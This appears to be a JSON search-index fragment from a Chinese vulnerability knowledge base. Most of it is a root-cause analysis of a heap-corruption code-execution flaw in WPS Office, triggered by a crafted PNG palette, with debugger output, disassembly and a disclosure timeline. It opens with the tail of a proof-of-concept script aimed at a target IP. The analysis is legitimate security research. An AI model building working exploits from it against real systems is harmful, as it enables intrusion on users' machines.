( '-t' , dest = 'target' , type = 'string' , help = '\u76ee\u6807ip' ) ( options , args ) = parser . parse_args () target = options . target if target : getpass ( target ) if __name__ == \"__main__\" : main ()","title":"POC"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%B1%B1/%E9%87%91%E5%B1%B1WPS%20Office%E8%BF%9C%E7%A8%8B%E5%A0%86%E6%8D%9F%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","text":"\u603b\u89c8 \u00b6 WPS Office\u662f\u7531Microsoft\u73e0\u6d77\u7684\u4e2d\u56fd\u8f6f\u4ef6\u5f00\u53d1\u5546\u91d1\u5c71\u8f6f\u4ef6\u5f00\u53d1\u7684\u529e\u516c\u5957\u4ef6\uff0c\u9002\u7528\u4e8eMicrosoft Windows\uff0cmacOS\uff0cLinux\uff0ciOS\u548cAndroid\u3002WPS Office\u7531\u4e09\u4e2a\u4e3b\u8981\u7ec4\u4ef6\u7ec4\u6210\uff1aWPS Writer\uff0cWPS Presentation\u548cWPS Spreadsheet\u3002\u4e2a\u4eba\u57fa\u672c\u7248\u672c\u53ef\u4ee5\u514d\u8d39\u4f7f\u7528\u3002WPS Office\u8f6f\u4ef6\u4e2d\u5b58\u5728\u4e00\u4e2a\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u6f0f\u6d1e\uff0c\u662f\u5f53Office\u8f6f\u4ef6\u5728\u5206\u6790\u7279\u5236Office\u6587\u4ef6\u65f6\u4e0d\u6b63\u786e\u5730\u5904\u7406\u5185\u5b58\u4e2d\u7684\u5bf9\u8c61\u65f6\u5f15\u8d77\u7684\u3002\u6210\u529f\u5229\u7528\u6b64\u6f0f\u6d1e\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u5f53\u524d\u7528\u6237\u7684\u4e0a\u4e0b\u6587\u4e2d\u8fd0\u884c\u4efb\u610f\u4ee3\u7801\u3002\u6545\u969c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u62d2\u7edd\u670d\u52a1\u3002\u6f0f\u6d1e\u4ea7\u54c1WPS Office\uff0c\u5f71\u54cd\u7248\u672c11.2.0.9453\u3002 \u6f0f\u6d1e\u5206\u6790 \u00b6 \u5728WPS Office\u4e2d\u7528\u4e8e\u56fe\u50cf\u683c\u5f0f\u89e3\u6790\u7684Qt\u6a21\u5757\u4e2d\u53d1\u73b0\u5806\u635f\u574f\u3002\u5d4c\u5165WPS office\u7684\u7279\u5236\u56fe\u50cf\u6587\u4ef6\u53ef\u80fd\u4f1a\u89e6\u53d1\u6b64\u6f0f\u6d1e\u3002\u6253\u5f00\u7279\u5236\u7684\u6587\u6863\u6587\u4ef6\u65f6\uff0c\u89e6\u53d1\u8bbf\u95ee\u51b2\u7a81\u3002EDX\u6307\u5411\u6570\u7ec4\u7684\u6307\u9488\uff0c\u800cEAX\u662f\u6307\u5411\u6570\u7ec4\u7684\u7d22\u5f15\u3002 0:000> g (c50.b4): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=000000c0 ebx=006f1c48 ecx=cd2aefbc edx=cd2c6f80 esi=2ed7ae18 edi=0000001c eip=6ba13321 esp=006f1b44 ebp=006f1b44 iopl=0 nv up ei pl nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00210202 QtCore4!QMatrix::dy+0x48a8: 6ba13321 8b448210 mov eax,dword ptr [edx+eax*4+10h] ds:002b:cd2c7290=???????? \u5d29\u6e83\u662f\u5982\u4f55\u89e6\u53d1\u7684\uff1f\u8ba9\u6211\u4eec\u770b\u4e00\u4e0bPNG\u6807\u5934\u683c\u5f0f\u3002 00029E30 FF 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 \u00ff\u2030PNG........IHD 00029E40 52 00 00 02 80 00 00 01 C6 04 03 00 00 00 16 0A R...\u20ac...\u00c6....... 00029E50 27 FC 00 00 00 04 67 41 4D 41 00 00 B1 88 95 98 '\u00fc....gAMA..\u00b1\u02c6\u2022\u02dc 00029E60 F4 A6 00 00 00 30 50 4C 54 45 00 00 00 80 00 00 \u00f4\u00a6...0PLTE...\u20ac.. 00029E70 00 80 00 80 80 00 00 00 80 80 00 80 00 80 80 80 .\u20ac.\u20ac\u20ac...\u20ac\u20ac.\u20ac.\u20ac\u20ac\u20ac 00029E80 80 80 C0 C0 C0 FF 00 00 00 FF 00 FF FF 00 00 00 \u20ac\u20ac\u00c0\u00c0\u00c0\u00ff...\u00ff.\u00ff\u00ff... 00029E90 FF FF 00 FF 00 FF FF FF FF FF 7B 1F B1 C4 00 00 \u00ff\u00ff.\u00ff.\u00ff\u00ff\u00ff\u00ff\u00ff{.\u00b1\u00c4.. \u4ece\u504f\u79fb\u91cf0x29E31\u5f00\u59cb-0x29E34\u662fPNG\u6587\u4ef6\u683c\u5f0f\u7684\u7b7e\u540d\u6807\u5934\u3002PNG\u5934\u6587\u4ef6\u7684\u7ed3\u6784\uff1a PNG signature --> IHDR --> gAMA --> PLTE --> pHYs --> IDAT --> IEND \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5f53WPS Office Suite\u4e2d\u4f7f\u7528\u7684QtCore\u5e93\u89e3\u6790PLTE\u7ed3\u6784\u5e76\u89e6\u53d1\u5806\u7834\u574f\u65f6\uff0c\u8be5\u6f0f\u6d1e\u4f4d\u4e8eWord\u6587\u6863\u4e2d\u7684\u5d4c\u5165\u5f0fPNG\u6587\u4ef6\u4e2d\u3002\u5728\u504f\u79fb\u91cf0x29E82\u52300x29E85\u5904\uff0c\u8c03\u8272\u677f\u7684\u89e3\u6790\u5931\u8d25\uff0c\u4ece\u800c\u89e6\u53d1\u4e86\u5806\u4e2d\u7684\u5185\u5b58\u635f\u574f\u3002\u5d29\u6e83\u89e6\u53d1\u4e4b\u524d\u7684\u5806\u6808\u8ddf\u8e2a\uff1a 00 00ee1790 6b8143ef QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a71 01 00ee17f0 6b814259 QtCore4!QBrush::setMatrix+0x234 02 00ee58d4 6b8249a4 QtCore4!QBrush::setMatrix+0x9e 03 00ee58ec 6b80cc84 QtCore4!QImage::rect+0x22b 04 00ee5908 6b857ccc QtCore4!QTransform::inverted+0xec8 05 00ee629c 6b81c55b QtCore4!QSvgFillStyle::setFillOpacity+0x1b59 06 00ee6480 6b896844 QtCore4!QPainter::drawPixmap+0x1c98 07 00ee6574 6d1e0fbd QtCore4!QPainter::drawImage+0x325 08 00ee6594 6d0dd155 kso!GdiDrawHoriLineIAlt+0x11a1a \u5728QtCore4\u89e3\u6790\u5d4c\u5165\u5f0f\u56fe\u50cf\u4e4b\u524d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6765\u81eaKSO\u6a21\u5757\u7684\u6700\u540e\u4e00\u6b21\u8c03\u7528\uff0c\u8bd5\u56fe\u5904\u7406\u56fe\u50cfkso\uff01GdiDrawHoriLineIAlt\u3002\u4f7f\u7528IDA Pro\u5206\u89e3\u5e94\u7528\u7a0b\u5e8f\u6765\u5206\u6790\u53d1\u751f\u5f02\u5e38\u7684\u529f\u80fd\u3002\u6700\u540e\u7684\u5d29\u6e83\u8def\u5f84\u5982\u4e0b\uff08WinDBG\u7ed3\u679c\uff09\uff1a QtCore4!QMatrix::dy+0x48a8: 6ba13321 8b448210 mov eax,dword ptr [edx+eax*4+10h] ds:002b:cd2c7290=???????? \u5728IDA Pro\u4e2d\u6253\u5f00\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u6309\u4ee5\u4e0b\u65b9\u5f0f\u53cd\u6c47\u7f16\u8be5\u51fd\u6570\uff1a .text:67353315 push ebp .text:67353316 mov ebp, esp .text:67353318 movzx eax, byte ptr [ecx+edx] ; crash here .text:6735331C mov ecx, [ebp+arg_0] .text:6735331F mov edx, [ecx] .text:67353321 mov eax, [edx+eax*4+10h] .text:67353325 mov ecx, eax \u4f7f\u7528\u6545\u969c\u8f6c\u50a8\u4e2d\u7684\u4fe1\u606f\uff0c\u6211\u4eec\u77e5\u9053\u5e94\u7528\u7a0b\u5e8f\u5728 0x67353321\uff08\u79fb\u52a8eax\uff0c[edx + eax * 4 + 10h]\uff09 \u5904\u89e6\u53d1\u4e86\u8bbf\u95ee\u51b2\u7a81\u3002\u6211\u4eec\u53ef\u4ee5\u770b\u5230EAX\u5bc4\u5b58\u5668\u75310xc0\u503c\u63a7\u5236\u3002\u56e0\u6b64\uff0c\u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u5bfc\u81f4\u5f02\u5e38\u7684\u6307\u4ee4\u5bf9\u5bc4\u5b58\u5668\u7684\u72b6\u6001\u8fdb\u884c\u4e00\u4e9b\u5047\u8bbe\u3002\u9700\u8981\u6ce8\u610f\u7684\u91cd\u8981\u4e00\u70b9\u662f\uff0c\u5728\u53d1\u751f\u5f02\u5e38\u4e4b\u524d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230ECX\uff080xc0\uff09\u4e2d\u5305\u542b\u7684\u503c\u6b63\u5728\u5199\u5165\u5230\u4ee5\u4e0b\u6307\u4ee4\u6240\u5b9a\u4e49\u7684\u4efb\u610f\u4f4d\u7f6e\uff1a mov ecx, [ebp+arg_0] \u6b64\u5916\uff0c\u6211\u4eec\u6ce8\u610f\u5230\uff0c\u5728\u6211\u4eec\u7684\u6545\u969c\u6307\u4ee4\u4e4b\u5916\uff0cEBP\u7684\u504f\u79fb\u91cf\u5b58\u50a8\u5728ECX\u5bc4\u5b58\u5668\u4e2d\u3002\u6211\u4eec\u5728\u524d\u9762\u63d0\u5230\u7684\u6307\u4ee4\uff08\u504f\u79fb\u91cf\u4e3a0x6ba1331c\uff09\u4e0a\u8bbe\u7f6e\u4e86\u4e00\u4e2a\u65ad\u70b9\uff0c\u4ee5\u89c2\u5bdf\u5185\u5b58\u3002\u65ad\u70b9\u89e6\u53d1\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7b2c\u4e00\u4e2a\u503cc45adfbc\u5f15\u7528\u4e86\u53e6\u4e00\u4e2a\u6307\u9488\uff0c\u8be5\u6307\u9488\u5e94\u8be5\u662f\u6307\u5411\u6570\u7ec4\u7684\u6307\u9488\u3002``` Breakpoint 0 hit eax=0000000f ebx=004f1b40 ecx=d3544100 edx=0000001c esi=d1200e18 edi=0000001c eip=6ba1331c esp=004f1a34 ebp=004f1a34 iopl=0 nv up ei pl nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00200202 QtCore4!QMatrix::dy+0x48a3: 6ba1331c 8b4d08 mov ecx,dword ptr [ebp+8] ss:002b:004f1a3c=c45adfbc 0:000> dc ebp+8 004f1a3c c45adfbc 00000048 00000000 6f13830f ..Z.H..........o 004f1a4c 004f5cc8 00000000 00000000 00000000 .\\O............. 004f1a5c 00000000 004f65a0 004f662c 00000000 .....eO.,fO..... 004f1a6c 779eae8e 00000000 00000001 3f800000 ...w...........? 004f1a7c 3f800000 3f31e4f8 3f800000 3f800000 ...?..1?...?...? 004f1a8c 3f800000 3f31e4f8 3f800000 3de38800 ...?..1?...?...= 004f1a9c 3de38800 3d9e1c8a 3c834080 004f3c00 ...=...=.@.<.<O. 004f1aac 4101c71c 6ba13315 3f800000 4081c71c ...A.3.k...?...@ \u4ecec45adfbc\u89c2\u5bdf\u5185\u5b58\u5f15\u7528\uff0c\u53d1\u73b0\u53e6\u4e00\u4e2a\u6307\u9488\u3002\u7b2c\u4e00\u4e2a\u503cab69cf80\u59cb\u7ec8\u8868\u793a\u4e3a\u6307\u5411\u5b83\u6240\u5f15\u7528\u7684\u4efb\u4f55\u5730\u65b9\u7684\u6307\u9488\u3002\u6307\u9488ab69cf80\u57fa\u672c\u4e0a\u662f\u6211\u4eec\u6307\u9488\u7684\u7d22\u5f15\u6570\u7ec4\u3002 0:000> dc c45adfbc c45adfbc ab69cf80 d3544100 00000003 00000280 ..i..AT......... c45adfcc 0000055a 00000012 c0c0c0c0 1c3870e2 Z............p8. c45adfdc 40ad870e 1c3870e2 40ad870e 00000000 ...@.p8....@.... c45adfec 00000000 c0c0c0c1 6c1d12c0 00000000 ...........l.... c45adffc c0c0c0c0 ???????? ???????? ???????? ....???????????? c45ae00c ???????? ???????? ???????? ???????? ???????????????? c45ae01c ???????? ???????? ???????? ???????? ???????????????? c45ae02c ???????? ???????? ???????? ???????? ???????????????? 0:000> dc ab69cf80 ab69cf80 00000001 0000001c 00000010 00000001 ................ // 0000001c is overwritten in the register EDX and EDI before we trigger crash ab69cf90 ff000000 ff800000 ff008000 ff808000 ................ ab69cfa0 ff000080 ff800080 ff008080 ff808080 ................ ab69cfb0 ffc0c0c0 ffff0000 ff00ff00 ffffff00 ................ // ffc0c0c0 where it will be stored in EAX after crash, at the moment it only takes 0xf value in EAX ab69cfc0 ff0000ff ffff00ff ff00ffff ffffffff ................ ab69cfd0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ ab69cfe0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ ab69cff0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ \u56e0\u4e3a\u6211\u4eec\u77e5\u9053\u5d29\u6e83\u7684\u8def\u5f84\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u7b80\u5355\u5730\u8bbe\u7f6e\u4e00\u4e2a\u65ad\u70b9\u3002\u8be5\u547d\u4ee4\u5c06\u83b7\u5f97\u6307\u9488\u503c\u201c edx + eax \\* 4 + 10\u201d\uff0c\u5e76\u68c0\u67e5\u5176\u662f\u5426\u6ee1\u8db30xc0\u3002 bp 6ba13321 \".if (poi(edx+eax*4+10) == 0xc0) {} .else {gc}\" 0:000> g eax=000000c0 ebx=004f1b40 ecx=c45adfbc edx=ab69cf80 esi=d1200e18 edi=0000001c eip=6ba13321 esp=004f1a34 ebp=004f1a34 iopl=0 nv up ei pl nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00200202 QtCore4!QMatrix::dy+0x48a8: 6ba13321 8b448210 mov eax,dword ptr [edx+eax*4+10h] ds:002b:ab69d290=???????? \u5982\u679c\u89c2\u5bdf\u5806\u6808\uff0c\u53ef\u4ee5\u770b\u5230\u4ee5\u4e0b\u6267\u884c\uff1a 004f1a38 6ba3cb98 QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a74 004f1a3c c45adfbc 004f1a40 00000048 004f1a44 00000000 004f1a48 6f13830f verifier!DphCommitMemoryForPageHeap+0x16f 004f1a4c 004f5cc8 004f1a50 00000000 004f1a54 00000000 004f1a58 00000000 004f1a5c 00000000 004f1a60 004f65a0 004f1a64 004f662c 004f1a68 00000000 004f1a6c 779eae8e ntdll!RtlAllocateHeap+0x3e \u5982\u679c\u6211\u4eec\u53cd\u6c47\u7f166ba3cb98\uff0c\u5219\u53ef\u4ee5\u770b\u5230\u4ee5\u4e0b\u53cd\u6c47\u7f16\u4ee3\u7801\u3002\u771f\u6b63\u7684\u6839\u672c\u539f\u56e0\u5728\u4e8e\u6b64\u4ee3\u7801\u3002 6ba3cb89 8b96b4000000 mov edx,dword ptr [esi+0B4h] 6ba3cb8f 8b4df4 mov ecx,dword ptr [ebp-0Ch] 6ba3cb92 52 push edx 6ba3cb93 8bd7 mov edx,edi 6ba3cb95 ff5580 call dword ptr [ebp-80h] 6ba3cb98 8b4e7c mov ecx,dword ptr [esi+7Ch] C pseudo code grad = *(&ptr_grad); if ( grad > 0.0099999998 ) { input_value = grad_size(check, size, input); ptr_grad = *(input); ... cut here ... \u6211\u4eec\u57286ba3cb89\u5730\u5740\u4e0a\u8bbe\u7f6e\u65ad\u70b9\uff0c\u5e76\u89c2\u5bdfESI + 0xB4\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u6307\u9488\u6307\u5411\u53e6\u4e00\u4e2a\u4f4d\u7f6e\uff1a 0:000> r eax=00000000 ebx=00791878 ecx=00000005 edx=00793938 esi=cb07de18 edi=0000001c eip=6ba3cb89 esp=00791780 ebp=00791870 iopl=0 nv up ei pl nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00200202 QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a65: 6ba3cb89 8b96b4000000 mov edx,dword ptr [esi+0B4h] ds:002b:cb07decc=cf69afbc 0:000> dc esi+0B4h cb07decc cf69afbc c0c0c000 00000000 00000100 ..i............. cb07dedc c0c0c0c0 00000000 00000000 00000000 ................ cb07deec 00000000 00000000 00000000 00000000 ................ cb07defc 00000000 cf030fd0 00000000 00000000 ................ cb07df0c 00000000 00000000 00000000 00000000 ................ cb07df1c c0c0c0c0 00000000 3ff00000 00000000 ...........?.... cb07df2c 00000000 00000000 00000000 00000000 ................ cb07df3c 00000000 00000000 3ff00000 00000000 ...........?.... 0:000> dc cf69afbc cf69afbc c88baf80 d1326100 00000003 00000280 .....a2......... cf69afcc 0000055f 00000012 c0c0c0c0 1c3870e2 _............p8. cf69afdc 40ad870e 1c3870e2 40ad870e 00000000 ...@.p8....@.... cf69afec 00000000 c0c0c0c1 6c1d12c0 00000000 ...........l.... cf69affc c0c0c0c0 ???????? ???????? ???????? ....???????????? cf69b00c ???????? ???????? ???????? ???????? ???????????????? cf69b01c ???????? ???????? ???????? ???????? ???????????????? cf69b02c ???????? ???????? ???????? ???????? ???????????????? 0:000> dc c88baf80 c88baf80 00000001 0000001c 00000010 00000001 ................ c88baf90 ff000000 ff800000 ff008000 ff808000 ................ c88bafa0 ff000080 ff800080 ff008080 ff808080 ................ c88bafb0 ffc0c0c0 ffff0000 ff00ff00 ffffff00 ................ c88bafc0 ff0000ff ffff00ff ff00ffff ffffffff ................ c88bafd0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ c88bafe0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ c88baff0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ \u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u4ee3\u7801\u5b9e\u9645\u4e0a\u6ca1\u6709\u4ece\u6307\u9488\u91ca\u653e\u4efb\u4f55\u4e1c\u897f\u3002\u4e00\u65e6\u79fb\u81f3EDX\uff0cEDX\u5c06\u4fdd\u7559\u6307\u5411\u7d22\u5f15\u6570\u7ec4\u7684\u6307\u9488\uff1a eax=00000000 ebx=00791878 ecx=00000005 edx=cf69afbc esi=cb07de18 edi=0000001c eip=6ba3cb8f esp=00791780 ebp=00791870 iopl=0 nv up ei pl nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00200202 QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a6b: 6ba3cb8f 8b4df4 mov ecx,dword ptr [ebp-0Ch] ss:002b:00791864=d1326100 0:000> dc cf69afbc cf69afbc c88baf80 d1326100 00000003 00000280 .....a2......... cf69afcc 0000055f 00000012 c0c0c0c0 1c3870e2 _............p8. cf69afdc 40ad870e 1c3870e2 40ad870e 00000000 ...@.p8....@.... cf69afec 00000000 c0c0c0c1 6c1d12c0 00000000 ...........l.... cf69affc c0c0c0c0 ???????? ???????? ???????? ....???????????? cf69b00c ???????? ???????? ???????? ???????? ???????????????? cf69b01c ???????? ???????? ???????? ???????? ???????????????? cf69b02c ???????? ???????? ???????? ???????? ???????????????? 0:000> dc c88baf80 c88baf80 00000001 0000001c 00000010 00000001 ................ c88baf90 ff000000 ff800000 ff008000 ff808000 ................ c88bafa0 ff000080 ff800080 ff008080 ff808080 ................ c88bafb0 ffc0c0c0 ffff0000 ff00ff00 ffffff00 ................ c88bafc0 ff0000ff ffff00ff ff00ffff ffffffff ................ c88bafd0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ c88bafe0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ c88baff0 c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 ................ \u5d29\u6e83\u540e\u7684\u5806\u6808\u8ddf\u8e2a\uff1a 0:000> kvL # ChildEBP RetAddr Args to Child 00 012f18d4 6ba3cb98 cc53afbc 00000048 00000000 QtCore4!QMatrix::dy+0x48a8 01 012f19d0 6b8143ef 00000000 012f1b78 012f1a5c QtCore4!path_gradient_span_gen::path_gradient_span_gen+0x6a74 02 012f1a30 6b814259 0000002e 012f5bd0 00000000 QtCore4!QBrush::setMatrix+0x234 03 012f5b14 6b8249a4 0000003b 012f5b68 cc780e18 QtCore4!QBrush::setMatrix+0x9e 04 012f5b2c 6b80cc84 0000003b 012f5b68 cc780e18 QtCore4!QImage::rect+0x22b 05 012f5b48 6b857ccc 0000003b 012f5b68 cc780e18 QtCore4!QTransform::inverted+0xec8 06 012f64dc 6b81c55b 00000000 003c0000 00000000 QtCore4!QSvgFillStyle::setFillOpacity+0x1b59 07 012f66c0 6b896844 012f6724 cc818ff0 0000001c QtCore4!QPainter::drawPixmap+0x1c98 08 012f67b4 6d1e0fbd 012f69ec 012f66d4 012f6864 QtCore4!QPainter::drawImage+0x325 09 012f67d4 6d0dd155 012f6a54 012f69ec 012f6864 kso!GdiDrawHoriLineIAlt+0x11a1a 0a 012f67ec 6d0c8d88 012f69ec 012f68e0 012f6864 kso!kpt::PainterExt::drawBitmap+0x23 \u5806\u5206\u6790\uff1a 0:000> !heap -p -a cc53afbc address cc53afbc found in _DPH_HEAP_ROOT @ 6731000 in busy allocation ( DPH_HEAP_BLOCK: UserAddr UserSize - VirtAddr VirtSize) cc36323c: cc53afa8 58 - cc53a000 2000 6f13ab70 verifier!AVrfDebugPageHeapAllocate+0x00000240 77a9909b ntdll!RtlDebugAllocateHeap+0x00000039 779ebbad ntdll!RtlpAllocateHeap+0x000000ed 779eb0cf ntdll!RtlpAllocateHeapInternal+0x0000022f 779eae8e ntdll!RtlAllocateHeap+0x0000003e 6f080269 MSVCR100!malloc+0x0000004b 6f08233b MSVCR100!operator new+0x0000001f 6b726c67 QtCore4!QImageData::create+0x000000fa 6b726b54 QtCore4!QImage::QImage+0x0000004e 6b7a0e21 QtCore4!png_get_text+0x00000436 6b79d7a8 QtCore4!QImageIOHandler::setFormat+0x000000de 6b79d457 QtCore4!QPixmapData::fromFile+0x000002bf 6b725eb4 QtCore4!QImageReader::read+0x000001e2 6d0ca585 kso!kpt::VariantImage::forceUpdateCacheImage+0x0000254e 6d0c5964 kso!kpt::Direct2DPaintEngineHelper::operator=+0x00000693 6d0c70d0 kso!kpt::RelativeRect::unclipped+0x00001146 6d0c8d0c kso!kpt::VariantImage::forceUpdateCacheImage+0x00000cd5 6d451d5c kso!BlipCacheMgr::BrushCache+0x0000049a 6d451e85 kso!BlipCacheMgr::GenerateBitmap+0x0000001d 6d453227 kso!BlipCacheMgr::GenCachedBitmap+0x00000083 6d29bb92 kso!drawing::PictureRenderLayer::render+0x000009b6 6d450fb1 kso!drawing::RenderTargetImpl::paint+0x00000090 6d29b528 kso!drawing::PictureRenderLayer::render+0x0000034c 6d2a2d83 kso!drawing::VisualRenderer::render+0x00000060 6d2b8970 kso!drawing::SingleVisualRenderer::drawNormal+0x000002b5 6d2b86a7 kso!drawing::SingleVisualRenderer::draw+0x000001e1 6d2b945e kso!drawing::SingleVisualRenderer::draw+0x00000046 6d3d0142 kso!drawing::ShapeVisual::paintEvent+0x0000044a 680a2b5c wpsmain!WpsShapeTreeVisual::getHittestSubVisuals+0x000068f1 6d0e36df kso!AbstractVisual::visualEvent+0x00000051 6d3cbe97 kso!drawing::ShapeVisual::visualEvent+0x0000018f 6d0eba90 kso!VisualPaintEvent::arriveVisual+0x0000004e 0:000> dt _DPH_BLOCK_INFORMATION cc780e18-0x20 verifier!_DPH_BLOCK_INFORMATION +0x000 StartStamp : 0xc0c0c0c0 +0x004 Heap : 0xc0c0c0c0 Void +0x008 RequestedSize : 0xc0c0c0c0 +0x00c ActualSize : 0xc0c0c0c0 +0x010 Internal : _DPH_BLOCK_INTERNAL_INFORMATION +0x018 StackTrace : 0xc0c0c0c0 Void +0x01c EndStamp : 0xc0c0c0c0 \u6bb5\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5806\u6761\u76ee\u901a\u5e38\u662f\u4e00\u4e2a\u7a7a\u95f2\u5757\u3002\u5806\u5757\u7684\u72b6\u6001\u6307\u793a\u4e3a\u7a7a\u95f2\u5757\u3002\u5806\u5757\u58f0\u660e\u524d\u4e00\u4e2a\u5757\u7684\u5927\u5c0f\u4e3a00108\uff0c\u800c\u5f53\u524d\u5757\u7684\u5927\u5c0f\u4e3a00a30\u3002\u524d\u4e00\u5757\u62a5\u544a\u5176\u81ea\u8eab\u5927\u5c0f\u4e3a0x20\u5b57\u8282\uff0c\u4e0d\u5339\u914d\u3002\u4f4d\u7f6e\u4e3a05f61000\u7684\u5806\u5757\u7684\u4f7f\u7528\u4f3c\u4e4e\u662f\u8be5\u5806\u5757\u7684\u4f7f\u7528\u5bfc\u81f4\u4ee5\u4e0b\u5757\u7684\u5143\u6570\u636e\u635f\u574f\u7684\u53ef\u80fd\u6027\u3002\u5806\u5757\uff1a 0:000> !heap -a 05f60000 Index Address Name Debugging options enabled 1: 05f60000 Segment at 05f60000 to 0605f000 (00001000 bytes committed) Flags: 00000002 ForceFlags: 00000000 Granularity: 8 bytes Segment Reserve: 00100000 Segment Commit: 00002000 DeCommit Block Thres: 00000200 DeCommit Total Thres: 00002000 Total Free Size: 00000146 Max. Allocation Size: fffdefff Lock Variable at: 05f60258 Next TagIndex: 0000 Maximum TagIndex: 0000 Tag Entries: 00000000 PsuedoTag Entries: 00000000 Virtual Alloc List: 05f6009c Uncommitted ranges: 05f6008c 05f61000: 000fe000 (1040384 bytes) FreeList[ 00 ] at 05f600c0: 05f605b8 . 05f605b8 05f605b0: 00108 . 00a30 [100] - free Segment00 at 05f60000: Flags: 00000000 Base: 05f60000 First Entry: 05f604a8 Last Entry: 0605f000 Total Pages: 000000ff Total UnCommit: 000000fe Largest UnCommit:00000000 UnCommitted Ranges: (1) Heap entries for Segment00 in Heap 05f60000 address: psize . size flags state (requested size) 05f60000: 00000 . 004a8 [101] - busy (4a7) 05f604a8: 004a8 . 00108 [101] - busy (107) Internal 05f605b0: 00108 . 00a30 [100] 05f60fe0: 00a30 . 00020 [111] - busy (1d) 05f61000: 000fe000 - uncommitted bytes. 0:000> dd 05f60fe0 05f60fe0 a9b3c836 03007087 05f6008c 05f6008c 05f60ff0 05f60038 05f60038 05f61000 000fe000 05f61000 ???????? ???????? ???????? ???????? 05f61010 ???????? ???????? ???????? ???????? 05f61020 ???????? ???????? ???????? ???????? 05f61030 ???????? ???????? ???????? ???????? 05f61040 ???????? ???????? ???????? ???????? 05f61050 ???????? ???????? ???????? ???????? ``` \u62ab\u9732\u65f6\u95f4\u8868 \u00b6 \u8be5\u6f0f\u6d1e\u4e8e2020\u5e748\u6708\u62a5\u544a\u3002\u62ab\u9732\u65f6\u95f4\u8868\uff1a 2020-08-04-\u5c06\u7535\u5b50\u90ae\u4ef6\u53d1\u9001\u5230\u516c\u5f00\u63d0\u4f9b\u7684WPS\u7684\u5404\u79cd\u90ae\u4ef6\u5217\u8868\uff08\u9500\u552e\u548c\u652f\u6301\uff09\u3002 2020-08-10-WPS\u56e2\u961f\u56de\u5e94\u8be5\u62a5\u544a\u53ef\u4ee5\u8f6c\u53d1\u7ed9\u4ed6\u4eec\u3002 2020-08-11-\u8981\u6c42\u8fdb\u4e00\u6b65\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u54a8\u8be2\u548c\u5411\u9002\u5f53\u7684\u6e20\u9053\u62ab\u9732\u7b49\u3002 2020-08-17-\u6839\u636e\u5148\u524d\u7684\u8981\u6c42\u4e0eWPS\u56e2\u961f\u8fdb\u884c\u8ddf\u8fdb\u3002 2020-08-18-WPS\u56e2\u961f\u505a\u51fa\u56de\u5e94\uff0c\u4ed6\u4eec\u4f1a\u7167\u987e\u597d\u5b83\uff0c\u5e76\u8f6c\u4ea4\u7ed9\u5f00\u53d1\u56e2\u961f\u3002 2020-08-18-\u901a\u8fc7\u7535\u5b50\u90ae\u4ef6\u63d0\u4f9b\u6280\u672f\u62a5\u544a\u548c\u6982\u5ff5\u9a8c\u8bc1\uff08\u672a\u52a0\u5bc6\uff09\u3002 2020-08-25-WPS\u8ddf\u8fdb\u62a5\u544a\u8fdb\u5ea6\u3002 2020-08-26-WPS\u66f4\u65b0\u8bf4\u6b64\u95ee\u9898\u5df2\u8f6c\u53d1\u7ed9\u5f00\u53d1\u56e2\u961f\u3002 2020-08-28-WPS\u53d1\u9001\u4e86\u4e00\u5c01\u7535\u5b50\u90ae\u4ef6\uff0c\u6307\u51fa\u8be5\u95ee\u9898\u5df2\u5728\u6700\u65b0\u7684\u4e0b\u8f7d\u7248\u672c11.2.0.9403\u4e2d\u5f97\u5230\u89e3\u51b3\u3002 2020-08-28-\u9488\u5bf9\u63d0\u4f9b\u7684PoC\u6d4b\u8bd5\u4e86\u65b0\u7248\u672c\uff0c\u5e76\u786e\u8ba4\u95ee\u9898\u5df2\u89e3\u51b3\u3002 2020-08-28-\u5411WPS\u56e2\u961f\u5bfb\u6c42\u54a8\u8be2\u6216\u66f4\u6539\u65e5\u5fd7\u66f4\u65b0\u3002 